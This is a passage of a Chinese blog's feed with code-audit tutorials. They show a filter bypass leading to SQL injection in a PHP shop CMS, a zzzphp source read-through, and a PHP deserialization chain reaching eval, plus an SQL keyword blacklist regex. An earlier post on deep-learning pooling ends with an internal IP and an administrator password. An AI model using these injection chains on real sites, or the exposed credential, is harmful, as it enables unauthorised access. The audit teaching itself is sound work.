layer）</h3><p>两种方式：</p><p>mean方式：将一个区域的值起来求均值作为一个特征</p><p>max方式：取一个区域中的最大值作为这个区域的特征</p><p><img src="/2021/04/26/深度学习笔记（一）/18.png" alt="18"></p><p>maxPoolin 前向传播：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def max_pool_forward_naive(x, pool_param):</span><br><span class="line">    HH, WW = pool_param[&apos;pool_height&apos;], pool_param[&apos;pool_width&apos;]</span><br><span class="line">    s = pool_param[&apos;stride&apos;]</span><br><span class="line">    N, C, H, W = x.shape</span><br><span class="line">    H_new = 1 + (H - HH) / s</span><br><span class="line">    W_new = 1 + (W - WW) / s</span><br><span class="line">    out = np.zeros((N, C, H_new, W_new))</span><br><span class="line">    for i in range(N):</span><br><span class="line">        for j in range(C):</span><br><span class="line">            for k in range(H_new):</span><br><span class="line">                for l in range(W_new):</span><br><span class="line">                    window = x[i, j, k*s:HH+k*s, l*s:WW+l*s] </span><br><span class="line">                    out[i, j, k, l] = np.max(window)</span><br><span class="line">    cache = (x, pool_param)</span><br><span class="line">    return out, cache</span><br></pre></td></tr></table></figure><p>maxPoolin 项反向传播：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def max_pool_backward_naive(dout, cache):</span><br><span class="line">    x, pool_param = cache</span><br><span class="line">    HH, WW = pool_param[&apos;pool_height&apos;], pool_param[&apos;pool_width&apos;]</span><br><span class="line">    s = pool_param[&apos;stride&apos;]</span><br><span class="line">    N, C, H, W = x.shape</span><br><span class="line">    H_new = 1 + (H - HH) / s</span><br><span class="line">    W_new = 1 + (W - WW) / s</span><br><span class="line">    dx = np.zeros_like(x)</span><br><span class="line">    for i in range(N):    </span><br><span class="line">        for j in range(C):        </span><br><span class="line">            for k in range(H_new):            </span><br><span class="line">                for l in range(W_new):                </span><br><span class="line">                    window = x[i, j, k*s:HH+k*s, l*s:WW+l*s]                </span><br><span class="line">                    m = np.max(window)               </span><br><span class="line">                    dx[i, j, k*s:HH+k*s, l*s:WW+l*s] = (window == m) * dout[i, j, k, l]</span><br><span class="line">    return dx</span><br></pre></td></tr></table></figure><h3 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h3><p><img src="/2021/04/26/深度学习笔记（一）/19.png" alt="19"></p><p><img src="/2021/04/26/深度学习笔记（一）/20.png" alt="20"></p><h2 id="第五章物体检测"><a href="#第五章物体检测" class="headerlink" title="第五章物体检测"></a>第五章物体检测</h2><p>10.1.12.71 ， 72</p><p>administrator/nlSOFT23</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;深度学习笔记（一）&quot;&gt;&lt;a href=&quot;#深度学习笔记（一）&quot; class=&quot;headerlink&quot; title=&quot;深度学习笔记（一）&quot;&gt;&lt;/a&gt;深度学习笔记（一）&lt;/h1&gt;
    
    </summary>
    
    
      <category term="人工智能" scheme="https://wq371680537.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>2.1过滤逻辑错误审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/2-1%E8%BF%87%E6%BB%A4%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/2-1过滤逻辑错误审计/</id>
    <published>2019-09-28T02:18:14.000Z</published>
    <updated>2019-09-28T02:57:58.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>本文审计的系统为云ec电商系统版本1.2.3，网上也有审计文章这里主要是讲讲，有些程序可能本身他的过滤代码还是比较不错，但是逻辑问题造成了过滤函数没有起作用。</p><h1 id="0x01-实例审计"><a href="#0x01-实例审计" class="headerlink" title="0x01 实例审计"></a>0x01 实例审计</h1><p>还是先从index.php文件看进去吧！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&apos;in_mx&apos;, TRUE);</span><br><span class="line"></span><br><span class="line">$ym_version=&apos;1.2.3&apos;;</span><br><span class="line">$p=isset($_GET[&apos;p&apos;]) ? addslashes($_GET[&apos;p&apos;]) : &apos;&apos;;</span><br><span class="line">$p=(trim($p)==&apos;&apos;) ? &apos;index&apos; : trim($p);</span><br><span class="line"></span><br><span class="line">require(&quot;./inc/function/global.php&quot;);</span><br><span class="line"></span><br><span class="line">switch ($p)&#123;</span><br><span class="line">case &apos;admin&apos;:</span><br><span class="line">include(&quot;./inc/function/global_admin&quot;.Ext);</span><br><span class="line">exit();</span><br><span class="line">    break;</span><br><span class="line">    case &apos;install&apos;:</span><br><span class="line">require(&quot;./install/index&quot;.Ext);</span><br><span class="line">exit();</span><br><span class="line">    break;</span><br><span class="line">    default:</span><br><span class="line">if(strpos($p, &quot;n-&quot;)===0 || $ym_url_path[0] === &apos;news&apos;)&#123;</span><br><span class="line">include(&quot;./inc/function/global_news&quot;.Ext);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">include(&quot;./inc/function/global_page&quot;.Ext);</span><br><span class="line">&#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从index.php来看是GET获取P参数然后引用对应的文件，先来看看/inc/function/global.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(&quot;customError&quot;,E_ERROR);</span><br><span class="line">$getfilter=&quot;\\b(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span><br><span class="line">$postfilter=&quot;\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span><br><span class="line">$cookiefilter=&quot;\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span><br><span class="line"></span><br><span class="line">function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq)&#123;  </span><br><span class="line">if(is_array($StrFiltValue))</span><br><span class="line">&#123;</span><br><span class="line">$StrFiltValue=implode($StrFiltValue);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,urldecode($StrFiltValue)))&#123;</span><br><span class="line">print &quot;网址有误~&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;      </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">foreach($_GET as $key=&gt;$value)&#123;</span><br><span class="line">StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line">if ($_GET[&quot;p&quot;]!==&apos;admin&apos;)&#123;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_COOKIE as $key=&gt;$value)&#123; </span><br><span class="line">StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br><span class="line">unset($_GET[&apos;_SESSION&apos;]);</span><br><span class="line">unset($_POST[&apos;_SESSION&apos;]);</span><br><span class="line">unset($_COOKIE[&apos;_SESSION&apos;]);</span><br></pre></td></tr></table></figure><p>这个正则貌似就是copy的360webscan的那个，这里GET、POST、COOKIE都被过滤了的，但是我们看到其中过滤POST的判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&quot;p&quot;]!==&apos;admin&apos;)&#123;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果GET传入的p=admin了就不会进入这个if语句，也达到我们绕过的目的了，然后往下面看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (!empty($_GET))&#123; foreach($_GET AS $key =&gt; $value) $$key = addslashes_yec($value); &#125;</span><br><span class="line">if (!empty($_POST))&#123; foreach($_POST AS $key =&gt; $value) $$key = addslashes_yec($value); &#125;</span><br></pre></td></tr></table></figure><p>这里我们传入的P参数的值被重新覆盖掉，然后经过<code>addslashes_yec</code>函数过滤。然后我们梳理一下审计思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 寻找SERVER获取的。</span><br><span class="line">2. 寻找数字型注入，结合上面的绕过，注入密码。</span><br></pre></td></tr></table></figure><p>先看看前台注入，这个cms注入比较多，我就随便写个了</p><p>\inc\module\cart.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">elseif ($act == &apos;remove_goods&apos;) //移除商品</span><br><span class="line">&#123;</span><br><span class="line">$ckey = $ckey ? intval($ckey) : intval($_COOKIE[&apos;ckey&apos;]);</span><br><span class="line">$gid_list = explode(&quot;@&quot;, $gid);</span><br><span class="line">$spec_list = explode(&quot;@&quot;, $spec);</span><br><span class="line"></span><br><span class="line">$db = dbc();</span><br><span class="line">$where =&apos;&apos;;</span><br><span class="line">if($ckey != 0)</span><br><span class="line">&#123;</span><br><span class="line">$where =&apos; and cid=&apos;.$ckey;</span><br><span class="line">&#125;</span><br><span class="line">elseif($ym_uid !=0)</span><br><span class="line">&#123;</span><br><span class="line">$where =&apos; and uid=&apos;.$ym_uid;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$res[&apos;err&apos;] = &apos;请刷新页面再试&apos;;</span><br><span class="line">die(json_encode_yec($res));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($gid_list as $k =&gt; $v) &#123;</span><br><span class="line">$sp = $spec_list[$k];</span><br><span class="line">if(intval($v)&lt;=0)</span><br><span class="line">&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db-&gt;query(&quot;delete i FROM &quot;.$db-&gt;table(&apos;cart&apos;).&quot; c join &quot;.$db-&gt;table(&apos;cart_item&apos;).&quot; i on c.id=i.cid where gid=&quot;.$v.&quot; and spec=&apos;&quot;.$sp.&quot;&apos; &quot;.$where);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cnum = get_cart_amount(1);</span><br><span class="line">$res[&apos;res&apos;] = $cnum;</span><br><span class="line">$time = time() + 15552000;</span><br><span class="line">set_cookie(&apos;cnum&apos;,  $cnum, $time); //购物车数量</span><br><span class="line">die(json_encode_yec($res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中传入的$gid经过<code>explode</code>函数分割（这里sql语句中不能使用@字符），然后foreach循环取出来后带入sql语句，也没有单双引号之类的包裹，比较明显的一处注入了。</p><p><img src="/2019/09/28/2-1过滤逻辑错误审计/2.1.0.png" alt="2.2.0"></p><p>如果没用绕过是会触发360webscan的</p><p><img src="/2019/09/28/2-1过滤逻辑错误审计/2.1.1.png" alt="2.2.1"></p><h1 id="0x02-文末"><a href="#0x02-文末" class="headerlink" title="0x02 文末"></a>0x02 文末</h1><p>这套程序在1.2.4这里修复了这个逻辑方面的问题貌似漏洞就没啥了。本版本还有很多注入大家可以自己审计一下，也可以看看水泡泡巨佬的<a href="https://www.cnblogs.com/r00tuser/p/9014869.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/9014869.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2.0通读全文审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/2-0%E9%80%9A%E8%AF%BB%E5%85%A8%E6%96%87%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/2-0通读全文审计/</id>
    <published>2019-09-28T02:18:03.000Z</published>
    <updated>2019-09-28T02:58:32.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>通读全文推荐大家开始可以审计一些比较好看懂的CMS，我们先看大体网站框架，这里你大概知道什么文件夹是放什么类型的文件，然后从<code>index.php</code>文件开始往里面读,然后重点关注是否有全局过滤等等。</p><h1 id="0x01-实例审计"><a href="#0x01-实例审计" class="headerlink" title="0x01 实例审计"></a>0x01 实例审计</h1><p>本文用到的源码是zzzphp，我们通过这个程序粗略的了解如何通读全文代码来审计，这里只做简单分析，不深入审计。</p><h2 id="了解网站框架"><a href="#了解网站框架" class="headerlink" title="了解网站框架"></a>了解网站框架</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">├─admin             //后台</span><br><span class="line">├─config            //配置文件</span><br><span class="line">├─form              //前台</span><br><span class="line">├─images            //图片</span><br><span class="line">├─inc               //包含文件</span><br><span class="line">├─install           //安装文件</span><br><span class="line">├─js                //js文件</span><br><span class="line">├─plugins           //插件</span><br><span class="line">├─runtime           //临时</span><br><span class="line">├─search            //搜索</span><br><span class="line">├─template          //模板</span><br><span class="line">├─upload            //上传文件夹</span><br><span class="line">└─wap               //手机</span><br></pre></td></tr></table></figure><p>首先我们看到这个结构，有一点审计基础或者会点英语应该都能看懂这些目录的意思，当然也有个别程序猿喜欢另类一点的命名规则，大体都是这样。</p><h2 id="了解网站过滤与路由"><a href="#了解网站过滤与路由" class="headerlink" title="了解网站过滤与路由"></a>了解网站过滤与路由</h2><p>我觉得全文通读不是无脑的去挨着读，这样比较浪费时间，我们一般应该先去读他的核心文件，一般都在包含文件夹里面，怎么去找核心文件一般是看文件名比如包含<code>main</code> <code>common</code>等等，也可以看看文件大小一般核心文件包含函数多文件相对较大，还可以通过入口文件一步一步去看，比如这里的核心文件就是<code>zzz_main.php</code>我们无非是先关注参数的获取、是否有全局过滤。</p><p>我们来到 <code>\inc\zzz_main.php</code></p><p><code>getlocation()</code> 解析URL</p><p><img src="/2019/09/28/2-0通读全文审计/2.0.0.png" alt="2.0.0"></p><p><code>getform()</code>获取参数</p><p><img src="/2019/09/28/2-0通读全文审计/2.0.1.png" alt="2.0.1"></p><p>过滤函数<code>txt_html()</code> 但是通常有关过滤的函数包含一些字符<code>safe</code>之类 或者包含函数 <code>htmlspecialchars()</code> <code>addslashes()</code></p><p><img src="/2019/09/28/2-0通读全文审计/2.0.2.png" alt="2.0.2"></p><h2 id="了解系统DB类"><a href="#了解系统DB类" class="headerlink" title="了解系统DB类"></a>了解系统DB类</h2><p>除了这个文件我们还可以看看<code>mysql</code> <code>db</code> 之类的关键词文件，看看他数据库连接的方式是否存在宽字节注入的可能，还有他的连接方式。</p><p><img src="/2019/09/28/2-0通读全文审计/2.0.6.png" alt="2.0.6"></p><h2 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h2><p>看完这些我们就可以从<code>index.php</code>一层一层读了。</p><p>来到 <code>index.php</code> 直接包含文件<code>inc/zzz_client.php</code> 先判断<code>isinstall</code> 然后执行后面</p><p><img src="/2019/09/28/2-0通读全文审计/2.0.3.png" alt="2.0.3"></p><p>看到最后一句<code>ParseGlobal(G(&#39;sid&#39;),G(&#39;cid&#39;));</code> 这里调用了<code>ParseGlobal()</code> 函数我们可以跟进去看看。</p><p>进入if分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( $sid &gt; 0 ) &#123;</span><br><span class="line">$data = db_load_one( &apos;sort&apos;, &apos;sid=&apos; . $sid );</span><br></pre></td></tr></table></figure><p>跟进函数<code>db_load_one()</code> 这里会把传入的&amp;替换为and</p><p><img src="/2019/09/28/2-0通读全文审计/2.0.4.png" alt="2.0.4"></p><p>跟进函数 <code>find_one()</code></p><p><img src="/2019/09/28/2-0通读全文审计/2.0.5.png" alt="2.0.5"></p><p>这里我就不详细跟了只介绍思路，基本上确定这里如果传入的参数没过滤那么这里就会存在注入。</p><p>这里跟一下 <code>G()</code> 就会发现是<code>$GLOBALS[ &#39;sid&#39; ]</code> 获取的，也就是前面解析url那里获取的值也没有过滤，那么这里基本上就是一个注入了。</p><p>读完这些文件我们就可以从各个功能文件夹的index读进去，比如这里我们来到<code>\search\index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&apos;LOCATION&apos;, &apos;search&apos;);</span><br><span class="line">require dirname(dirname(__FILE__)). &apos;/inc/zzz_client.php&apos;;</span><br></pre></td></tr></table></figure><p>还是回到刚刚我们跟进的文件 <code>/inc/zzz_client.php</code> 搜索<code>search</code>关键词然后读源码分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case &apos;search&apos;:</span><br><span class="line"> $tplfile= TPL_DIR . &apos;search.html&apos;; </span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>看到选中<code>Search</code>后赋值给了变量<code>$tplfile</code> 然后我们在追踪变量在那个地方被调用过</p><p><img src="/2019/09/28/2-0通读全文审计/2.0.7.png" alt="2.0.7"></p><p>发现他解析模板的过程，然后跟进<code>ParserTemplate</code> 来到<code>inc\zzz_template.php</code> 然后往下面读发现一个函数<code>getform()</code></p><p><img src="/2019/09/28/2-0通读全文审计/2.0.8.png" alt="2.0.8"></p><p><code>getform()</code>函数获取过滤之后还被被 <code>safe_key()</code> 函数过滤，但是看到下面还有函数<code>get_cookie</code> 看样子也是获取参数的，但是这个用到函数<code>isset()</code> 他是一个检测变量的函数，定义了即为true 所以这里根本进不去，不然就是一个注入了,当然这也是一个老版本的注入，我这里的版本已经修复了。接下来还可以从<code>admin</code>的<code>index.php</code>开始读，多关注一些功能点，推荐可以搭建起来熟悉一下整套程序。</p><h1 id="0x02-文末"><a href="#0x02-文末" class="headerlink" title="0x02 文末"></a>0x02 文末</h1><p>通读这个ZZZCMS 我们可以知道，他在调用<code>getform()</code>函数的时候我们基本不考虑注入了，因为已经被过滤了，除非他后面用其他函数处理了一下。在调试复杂语句的时候我们可以通过mysql监控软件来调试。当我们发现一类函数或者写法存在漏洞的时候，可以使用全文搜索，来查找相同的代码对一类进行完整挖掘。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.9.反序列化审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-9-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-9-反序列化审计/</id>
    <published>2019-09-28T02:17:44.000Z</published>
    <updated>2019-09-28T03:00:08.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>PHP反序列化漏洞，在我们使用<code>unserialize()</code>进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过程。</p><h1 id="0x01-初识反序列化"><a href="#0x01-初识反序列化" class="headerlink" title="0x01 初识反序列化"></a>0x01 初识反序列化</h1><p>反序列化我们需要了解php的类和魔术方法，这里举个简单的例子用到的魔术方法是<code>__destruct</code> 销毁一个类之前执行执行析构方法。</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.1.png" alt="1.9.1"></p><p>当对象创建后输出我们的<code>$a</code>变量的值。那么我们把它的值改变后用<code>serialize()</code>看看</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.2.png" alt="1.9.2"></p><p><code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:5:&quot;12345&quot;;}</code> 是我们序列化的值，然后<code>unserialize($_GET[&#39;id&#39;]);</code>传入我们改变的值 <code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;404&quot;;}</code> 成功打印了我们的改变的值，因为反序列化我们可以控制类属性且这个过程会触发这些能够触发的魔术方法。</p><p>这里网上可以找到一些魔术方法,当然还有些可以绕过具体大家搜索一下我这里就不细写了，具体情况具体分析，反序列化难一点的还是需要很大的耐心才能完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h1 id="0x02-简单的一道题"><a href="#0x02-简单的一道题" class="headerlink" title="0x02 简单的一道题"></a>0x02 简单的一道题</h1><p>下面我改了写一道简单的CTF，看看怎么利用它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class foo1&#123;</span><br><span class="line">    public $varr;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;varr-&gt;evaltest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class foo2&#123;</span><br><span class="line">    public $str;</span><br><span class="line">    function evaltest()&#123;</span><br><span class="line">        eval($this-&gt;str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们看到在foo2中<code>evaltest()</code>函数中存在eval，而foo1中调用了函数<code>evaltest()</code>，我们就想可不可以让foo1调用foo2中的<code>evaltest()</code>函数顺边还把它的<code>$str</code>中的值改写了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class foo1&#123;</span><br><span class="line">    public $varr;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;varr = new foo2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class foo2&#123;</span><br><span class="line">    public $str;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;str = &apos;phpinfo();&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new foo1();</span><br><span class="line">echo serialize($obj); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们把<code>$varr</code>变量赋值为<code>new foo2()</code> 然后它再去调用 <code>evaltest()</code>函数 然后我们把<code>$str</code>的值换成 我们想执行的命令。</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.3.png" alt="1.9.3"></p><h1 id="0x03-实例审计"><a href="#0x03-实例审计" class="headerlink" title="0x03 实例审计"></a>0x03 实例审计</h1><p>找了半天源码我觉得最有意义的，审计的最多的一次反序列化当属Typecho1.1版本的漏洞了。可能看起来有点吃力我尽量分析的详细一点。</p><p>来到文件 <code>install.php</code></p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.4.png" alt="1.9.4"></p><p>我们看到要绕过<code>install.php</code>这个程序的<code>exit</code> 我们只需要传入的<code>finish</code>值不为空且<code>referer</code>为本站的值就能绕过。</p><p>我们来到核心部分</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.5.png" alt="1.9.5"></p><p>这里调用<code>Typecho_Cookie</code>类的<code>get</code>方法 ，我这里就不跟进去了，就是获取cookies的<code>__typecho_config</code> 